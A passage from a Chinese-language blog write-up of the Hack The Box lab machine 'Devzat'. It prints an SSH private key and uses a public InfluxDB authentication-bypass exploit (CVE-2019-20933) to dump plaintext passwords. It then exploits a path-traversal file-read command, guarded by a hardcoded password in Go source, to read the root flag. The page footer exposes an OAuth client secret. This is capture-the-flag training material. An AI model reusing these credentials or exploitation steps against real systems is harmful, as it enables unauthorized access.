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
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# chmod 700 id_rsa

┌──(root💀kali)-[~/Desktop]
└─# ssh patrick@10.10.11.118 -i id_rsa        
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 19 Feb 2022 09:20:45 AM UTC

  System load:  0.01              Processes:                243
  Usage of /:   55.8% of 7.81GB   Users logged in:          1
  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118

107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Feb 19 09:18:30 2022 from 10.10.16.23
</code></pre>
<p>成功登录ssh</p>
<pre><code class="bash">patrick@devzat:~$ whoami&amp;&amp;id
patrick
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
</code></pre>
<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre><code class="bash">patrick@devzat:~$ ss -tunlp
Netid             State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port             Process                                       
udp               UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*                                                              
tcp               LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*                                                              
tcp               LISTEN              0                   4096                                 127.0.0.1:8086                                0.0.0.0:*                                                              
tcp               LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                                              
tcp               LISTEN              0                   4096                                 127.0.0.1:8443                                0.0.0.0:*                                                              
tcp               LISTEN              0                   4096                                 127.0.0.1:5000                                0.0.0.0:*                 users:((&quot;petshop&quot;,pid=908,fd=3))             
tcp               LISTEN              0                   511                                          *:80                                        *:*                                                              
tcp               LISTEN              0                   128                                       [::]:22                                     [::]:*                                                              
tcp               LISTEN              0                   4096                                         *:8000                                      *:*                 users:((&quot;devchat&quot;,pid=907,fd=7))
</code></pre>
<p>这里我们把8086端口转发出去</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i id_rsa 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 19 Feb 2022 09:30:33 AM UTC

  System load:  0.0               Processes:                246
  Usage of /:   55.8% of 7.81GB   Users logged in:          1
  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118

107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Feb 19 09:20:46 2022 from 10.10.14.47
</code></pre>
<p>成功转发出来</p>
<h3 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nmap -p 8086 -sC -sV 127.0.0.1                      
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 04:33 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000048s latency).

PORT     STATE SERVICE VERSION
8086/tcp open  http    InfluxDB http admin 1.7.5
|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
</code></pre>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>这里发现是InfluxDB，去搜索一下是否有相关的漏洞</p>
<blockquote>
<p><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" target="_blank" rel="noopener">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></p>
</blockquote>
<p>使用该Exploit进行攻击</p>
<pre><code class="bash">git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
cd InfluxDB-Exploit-CVE-2019-20933
pip install -r requirements.txt
</code></pre>
<p>下载安装所需要的环境</p>
<p>然后执行</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop/InfluxDB-Exploit-CVE-2019-20933]
└─# python3 __main__.py

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | &#39;_ \|  _| | | | \ \/ / |  | |  _ &lt;  |  __| \ \/ / &#39;_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |&gt;  &lt;| |__| | |_) | | |____ &gt;  &lt;| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username &lt;OR&gt; path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: devzat

Starting InfluxDB shell - .back to go back
[admin@127.0.0.1/devzat] $ SELECT * FROM &quot;user&quot;
{
    &quot;results&quot;: [
        {
            &quot;series&quot;: [
                {
                    &quot;columns&quot;: [
                        &quot;time&quot;,
                        &quot;enabled&quot;,
                        &quot;password&quot;,
                        &quot;username&quot;
                    ],
                    &quot;name&quot;: &quot;user&quot;,
                    &quot;values&quot;: [
                        [
                            &quot;2021-06-22T20:04:16.313965493Z&quot;,
                            false,
                            &quot;WillyWonka2021&quot;,
                            &quot;wilhelm&quot;
                        ],
                        [
                            &quot;2021-06-22T20:04:16.320782034Z&quot;,
                            true,
                            &quot;woBeeYareedahc7Oogeephies7Aiseci&quot;,
                            &quot;catherine&quot;
                        ],
                        [
                            &quot;2021-06-22T20:04:16.996682002Z&quot;,
                            true,
                            &quot;RoyalQueenBee$&quot;,
                            &quot;charles&quot;
                        ]
                    ]
                }
            ],
            &quot;statement_id&quot;: 0
        }
    ]
}
</code></pre>
<h3 id="Catherine"><a href="#Catherine" class="headerlink" title="Catherine"></a>Catherine</h3><p>在ssh中使用su切换到catherine用户</p>
<pre><code class="bash">username = catherine
password = woBeeYareedahc7Oogeephies7Aiseci
</code></pre>
<pre><code class="bash">catherine@devzat:~$ ls
dev  devzat-dev.zip  devzat-main.zip  main  user.txt
catherine@devzat:~$ cat user.txt 
a45f55a41f9cd103ea222c1e00466341
</code></pre>
<p>成功拿到user权限的flag文件</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><pre><code class="bash">catherine@devzat:/var/backups$ ls
apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  devzat-dev.zip  devzat-main.zip
</code></pre>
<p>在&#x2F;var&#x2F;backups目录中有两个zip文件，我们copy出来解压出来看看</p>
<pre><code class="bash">catherine@devzat:/tmp/lucifiel$ ls
dev  devzat-dev.zip  devzat-main.zip  main
</code></pre>
<pre><code class="bash">catherine@devzat:/tmp/lucifiel$ diff main/commands.go dev/commands.go
3a4
&gt;       &quot;bufio&quot;
4a6,7
&gt;       &quot;os&quot;
&gt;       &quot;path/filepath&quot;
36a40
&gt;               file        = commandInfo{&quot;file&quot;, &quot;Paste a files content directly to chat [alpha]&quot;, fileCommand, 1, false, nil}
38c42,101
&lt;       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}
---
&gt;       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
&gt; }
&gt; 
&gt; func fileCommand(u *user, args []string) {
&gt;       if len(args) &lt; 1 {
&gt;               u.system(&quot;Please provide file to print and the password&quot;)
&gt;               return
&gt;       }
&gt; 
&gt;       if len(args) &lt; 2 {
&gt;               u.system(&quot;You need to provide the correct password to use this function&quot;)
&gt;               return
&gt;       }
&gt; 
&gt;       path := args[0]
&gt;       pass := args[1]
&gt; 
&gt;       // Check my secure password
&gt;       if pass != &quot;CeilingCatStillAThingIn2021?&quot; {
&gt;               u.system(&quot;You did provide the wrong password&quot;)
&gt;               return
&gt;       }
&gt; 
&gt;       // Get CWD
&gt;       cwd, err := os.Getwd()
&gt;       if err != nil {
&gt;               u.system(err.Error())
&gt;       }
&gt; 
&gt;       // Construct path to print
&gt;       printPath := filepath.Join(cwd, path)
&gt; 
&gt;       // Check if file exists
&gt;       if _, err := os.Stat(printPath); err == nil {
&gt;               // exists, print
&gt;               file, err := os.Open(printPath)
&gt;               if err != nil {
&gt;                       u.system(fmt.Sprintf(&quot;Something went wrong opening the file: %+v&quot;, err.Error()))
&gt;                       return
&gt;               }
&gt;               defer file.Close()
&gt; 
&gt;               scanner := bufio.NewScanner(file)
&gt;               for scanner.Scan() {
&gt;                       u.system(scanner.Text())
&gt;               }
&gt; 
&gt;               if err := scanner.Err(); err != nil {
&gt;                       u.system(fmt.Sprintf(&quot;Something went wrong printing the file: %+v&quot;, err.Error()))
&gt;               }
&gt; 
&gt;               return
&gt; 
&gt;       } else if os.IsNotExist(err) {
&gt;               // does not exist, print error
&gt;               u.system(fmt.Sprintf(&quot;The requested file @ %+v does not exist!&quot;, printPath))
&gt;               return
&gt;       }
&gt;       // bokred?
&gt;       u.system(&quot;Something went badly wrong.&quot;)
</code></pre>
<p>这里获得了一个密码CeilingCatStillAThingIn2021?，同时分析代码后知道了存在可控的文件读取功能，通过控制第一个参数控制路径，通过控制第二个参数pass绕过检测</p>
<pre><code class="bash">ssh -l test localhost -p 8443
</code></pre>
<pre><code class="bash">catherine@devzat:/tmp/lucifiel$ ssh -l test localhost -p 8443
                                                                                                                                                                                                  13 minutes earlier
devbot: catherine has joined the chat
                                                                                                                                                                                                  12 minutes earlier
catherine: all
                                                                                                                                                                                                    1 minute earlier
devbot: test has joined the chat 
test: file ../../../../root/root.txt CeilingCatStillAThingIn2021?
catherine: close
devbot: test has left the chat 
devbot: test stayed on for 1 minute 
catherine: exit
Welcome to the chat. There is one more user
devbot: test has joined the chat
test: /file ../../../../root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] c2b07bb41d02e2c880a4d1c9469d13ef
</code></pre>
<p>成功获得root权限的flag文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&title=《Devzat - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&title=《Devzat - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Devzat - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Meta - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/02/19/Hackthebox/Easy/Hackthebox-Paper/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Paper - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&title=《Devzat - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&title=《Devzat - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Devzat - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACs0lEQVR42u3a0arbMBAE0Pv/P91CX1oocWd2pdwUjp+Ckyg6Dljy7H59xcePX8er13+eeT7/PMLzOK9GO3Dg4eHhjab+6vh7Qs/fep5WciHy+Tx/Bg8PD+82L18M8nvvbJxk+UnmjIeHh/cJvGQz3Y6cj4+Hh4f3P/I28cRs4cHDw8P7ZN6ph/82eshncj1rwcPDw4t5+wLY+1+/tb6Hh4eHV96I89L+ZrFpy2zRPPHw8PAu8Nr44EZw0IbFeTEMDw8P7wZvM9CmlSqJhp+Xh+S38PDw8G7wNgtAfmnalqyiuLVY3vDw8PBmvORnkhJX27bVRhvDxi88PDy8C7xNW8Bs4ztrIJhlC3h4eHg3eLOSUr6E5EvRrB/gHyPj4eHhXeMlj/2bSHeflNTb6HYqeHh4eGVcm2yv22f8dvPdjjD72/Dw8PBO8drS+6yIFW2Cy813HUng4eHhrXmbotRzVJFvvmfxRxSL4OHh4V3gbRaGvAVhFuO2lyyq7+Hh4eEd5SUB7iaquLcYRJ0ReHh4eId4m0aoPXhTQoviCTw8PLzLvP12dtYQkEfAebsVHh4e3j1ectOfRbFJGLFvzCqeGPDw8PAO8drNa37jbqey2bK/PIOHh4d3gddugledsNfatoo54+Hh4V3jJUWs2TjtcrKKcfHw8PC+iZcP0V6ONg5uv4WHh4d3j9c2TuURwCye2P9XRZiLh4eHd4GXv8635vk2+kAUgoeHh3eUNys7tfFBu4S0oe3L7+Lh4eFd4M1uuO3PJOHFbAt+rHSHh4eHV/LalqlNsX/zbn5Z8fDw8N7Dm5Wd8s+0F+tAyoKHh4f3MbxkYThVxNrHHHh4eHjfy5vlGcn4LaCYGx4eHt41Xlv0mpWvWsCx4hYeHh7eUd6+ANaW/NsgI1k2Ltb38PDw8H6f+QkpYbtg5tCoTgAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
